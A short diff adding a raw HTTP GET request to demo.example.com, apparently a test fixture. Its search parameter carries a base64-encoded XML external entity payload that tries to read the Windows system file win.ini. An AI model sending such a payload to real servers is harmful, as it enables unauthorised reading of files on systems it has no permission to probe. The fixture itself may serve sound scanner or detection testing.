@@ -1,0 +1,4 @@
+GET /a?search=PD94bWwgdmVyc2lvbj0iMS4wIj8%2BPCFET0NUWVBFIGZvbyBTWVNURU0gImZpbGU6Ly8vYzovd2luZG93cy93aW4uaW5pIj48ci8%2B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
